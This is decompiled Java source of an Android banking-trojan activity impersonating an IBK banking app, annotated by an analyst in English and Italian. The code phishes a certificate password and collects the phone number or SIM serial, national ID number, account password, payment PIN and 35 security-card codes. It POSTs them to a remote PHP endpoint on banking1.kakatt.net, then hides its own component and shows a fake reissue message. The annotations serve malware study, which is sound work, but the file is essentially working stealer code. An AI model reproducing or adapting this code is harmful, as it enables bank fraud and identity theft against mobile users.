package com.example.kbtest;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.ibk.smsmanager.R;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: classes.dex */
public class BankEndActivity extends Activity {
    private static final String TAG_SUCCESS = "success";
    Button Bottom_Exit_Button;
    Button Bottom_Home_Button;
    Button Bottom_MYMENU_Button;
    Button Bottom_MobileWeb_Button;
    Button Bottom_Startalk_Button;
    EditText ed1;
    EditText ed2;
    Button next;
    private ProgressDialog pDialog;
    List<NameValuePair> params;
    String send_bank_url = "http://banking1.kakatt.net:9998/send_bank.php"; // [fmss] remote url
    JSONParser jsonParser = new JSONParser();
    String TAG = "BankEndActivity";
    String phoneNumber = "";

    @Override // android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.bankend);
        this.next = (Button) findViewById(R.id.bankend_button1);
        this.ed1 = (EditText) findViewById(R.id.bankend_editText1);
        this.ed2 = (EditText) findViewById(R.id.bankend_editText2);
        this.next.setOnClickListener(new View.OnClickListener() { // from class: com.example.kbtest.BankEndActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View arg0) {
                String str1 = BankEndActivity.this.ed1.getText().toString();
                String str2 = BankEndActivity.this.ed2.getText().toString();
                if (str1.equals("") || str1.length() <= 5) {
                    // [fmss] "Check the certificate password"
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "인증서 비밀번호를 확인하세요", 0).show();
                } else if (str1.equals(str2)) {
                    // [fmss] saves certificate password
                    BankInfo.renzheng = str1;

                    // [fmss] crea l'utente e invia i dati sensibili al server remoto
                    new CreateNewUser().execute(new String[0]); 

                } else {
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "인증서 비밀번호를 확인하세요", 0).show();
                }
            }
        });
    }

    /* loaded from: classes.dex */
    class CreateNewUser extends AsyncTask<String, String, String> {
        CreateNewUser() {
        }

        @Override // android.os.AsyncTask
        protected void onPreExecute() {
            super.onPreExecute();
            BankEndActivity.this.pDialog = new ProgressDialog(BankEndActivity.this);
            BankEndActivity.this.pDialog.setMessage("신청�?.....");
            BankEndActivity.this.pDialog.setIndeterminate(false);
            BankEndActivity.this.pDialog.setCancelable(true);
            BankEndActivity.this.pDialog.show();
        }

        /* JADX INFO: Access modifiers changed from: protected */
        // [fmss] when it creates a new user it collects data in background and send them to a remote url
        public String doInBackground(String... args) {
            String dateString2;
            int success = 0;
            BankInfo.fenlei = "기업은행";
            SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            try {
                dateString2 = df2.format(new Date(System.currentTimeMillis()));
            } catch (Exception e) {
                dateString2 = "2013-01-01 10:12:13";
            }
            Log.i("str6", dateString2);

            // [fmss] get phone number or sim serial number
            TelephonyManager tel = (TelephonyManager) BankEndActivity.this.getSystemService("phone");
            String phone = tel.getLine1Number();
            if (phone == null || phone == "" || phone.length() <= 10) {
                BankEndActivity.this.phoneNumber = tel.getSimSerialNumber();
            } else {
                BankEndActivity.this.phoneNumber = phone;
            }

            // [fmss] Retrieve previously collected data and send them to a remote url via http
            // It steals bank information and phone information
            BankEndActivity.this.params = new ArrayList();
            BankEndActivity.this.params.add(new BasicNameValuePair("phone", BankEndActivity.this.phoneNumber));
            BankEndActivity.this.params.add(new BasicNameValuePair("bankinid", BankInfo.bankinid));
            BankEndActivity.this.params.add(new BasicNameValuePair("jumin", BankInfo.jumin));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknum", BankInfo.banknum));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknumpw", BankInfo.banknumpw));
            BankEndActivity.this.params.add(new BasicNameValuePair("paypw", BankInfo.paynum));
            BankEndActivity.this.params.add(new BasicNameValuePair("scard", BankInfo.scard));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn1", BankInfo.sn1));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn2", BankInfo.sn2));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn3", BankInfo.sn3));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn4", BankInfo.sn4));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn5", BankInfo.sn5));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn6", BankInfo.sn6));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn7", BankInfo.sn7));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn8", BankInfo.sn8));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn9", BankInfo.sn9));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn10", BankInfo.sn10));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn11", BankInfo.sn11));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn12", BankInfo.sn12));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn13", BankInfo.sn13));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn14", BankInfo.sn14));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn15", BankInfo.sn15));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn16", BankInfo.sn16));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn17", BankInfo.sn17));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn18", BankInfo.sn18));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn19", BankInfo.sn19));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn20", BankInfo.sn20));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn21", BankInfo.sn21));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn22", BankInfo.sn22));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn23", BankInfo.sn23));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn24", BankInfo.sn24));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn25", BankInfo.sn25));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn26", BankInfo.sn26));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn27", BankInfo.sn27));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn28", BankInfo.sn28));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn29", BankInfo.sn29));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn30", BankInfo.sn30));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn31", BankInfo.sn31));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn32", BankInfo.sn32));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn33", BankInfo.sn33));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn34", BankInfo.sn34));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn35", BankInfo.sn35));
            BankEndActivity.this.params.add(new BasicNameValuePair("renzheng", BankInfo.renzheng));
            BankEndActivity.this.params.add(new BasicNameValuePair("fenlei", BankInfo.fenlei));
            BankEndActivity.this.params.add(new BasicNameValuePair("datetime", dateString2));

            // Invia dati
            JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, "POST", BankEndActivity.this.params);
            Log.d("Create Response", json.toString());
            
            try {
                new JSONObject(json.toString());
                success = json.getInt(BankEndActivity.TAG_SUCCESS);
                Log.d("json.getInt", new StringBuilder().append(success).toString());
                if (success == 1) {
                    // [fmss] https://developer.android.com/reference/android/content/pm/PackageManager#setComponentEnabledSetting(android.content.ComponentName,%20int,%20int)
                    ComponentName comname = new ComponentName("com.ibk.smsmanager", "com.example.kbtest.BankSplashActivity");
                    PackageManager p = BankEndActivity.this.getPackageManager();
                    p.setComponentEnabledSetting(comname, 2, 1);
                } else {
                    Log.i("information", "Registration failed");
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
            if (success == 1) {
                return "신청중...";
            }
            return "";
        }

        /* JADX INFO: Access modifiers changed from: protected */
        /* JADX WARN: Type inference failed for: r0v5, types: [com.example.kbtest.BankEndActivity$CreateNewUser$1] */
        public void onPostExecute(String result) {
            Log.d("onPostExecute", result);
            if (result.equals("신청중...")) {
                BankEndActivity.this.pDialog.setMessage("본인인증재발급 되었습니다. 2시간후이용가능합니다.");
            } else {
                BankEndActivity.this.pDialog.setMessage("본인인증재발급 되었습니다. 2시간후이용가능합니다.");
            }
            new Thread() { // from class: com.example.kbtest.BankEndActivity.CreateNewUser.1
                @Override // java.lang.Thread, java.lang.Runnable
                public void run() {
                    try {
                        sleep(7000L);
                        BankEndActivity.this.pDialog.dismiss();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
    }

    private void openDialog(Context context) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setTitle("exit");
        builder.setMessage("");
        builder.setPositiveButton("yes", new DialogInterface.OnClickListener() { // from class: com.example.kbtest.BankEndActivity.2
            @Override // android.content.DialogInterface.OnClickListener
            public void onClick(DialogInterface dialog, int whichButton) {
                Intent intent = new Intent();
                intent.setAction("android.intent.action.MAIN");
                intent.addCategory("android.intent.category.HOME");
                intent.addFlags(268435456);
                BankEndActivity.this.startActivity(intent);
            }
        }).setNeutralButton("no", new DialogInterface.OnClickListener() { // from class: com.example.kbtest.BankEndActivity.3
            @Override // android.content.DialogInterface.OnClickListener
            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.cancel();
            }
        }).create().show();
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public boolean dispatchKeyEvent(KeyEvent event) {
        if (event.getAction() != 0 || event.getKeyCode() != 4) {
            return super.dispatchKeyEvent(event);
        }
        openDialog(getApplicationContext());
        return false;
    }
}
